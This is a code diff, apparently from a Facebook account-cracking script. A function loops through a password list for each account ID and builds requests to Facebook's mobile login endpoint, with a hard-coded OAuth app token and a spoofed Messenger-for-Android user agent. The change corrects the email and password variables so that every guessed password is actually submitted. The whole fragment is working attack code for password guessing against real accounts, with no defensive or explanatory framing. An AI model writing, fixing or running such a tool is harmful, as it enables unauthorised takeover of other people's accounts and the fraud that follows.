@@ -906,8 +906,8 @@ def m7(ids,pwv):
     try:
         for pas in pwv:
             info={
-            "email": sid,
-            "password": ps,
+            "email": ids,
+            "password": pas,
             "method": "post",
             "pretty": "false",
             "format": "json",
@@ -954,7 +954,7 @@ def m7(ids,pwv):
             "x-fb-connection-type": "WIFI",
             "x-fb-background-state": "1",
             "x-graphql-request-purpose": "fetch",
-            "user-agent": useragent(),
+            "user-agent": 'Dalvik/2.1.0 (Linux; U; Android 12; Pixel 3 Build/SP1A.210812.016.C2) [FBAN/Orca-Android;FBAV/412.0.0.15.69;FBPN/com.facebook.orca;FBLC/en_US;FBBV/481775700;FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FBBK/1;FBLR/0;FB_FW/1;]',
             "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
             "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
             "x-graphql-client-library": "graphservice",
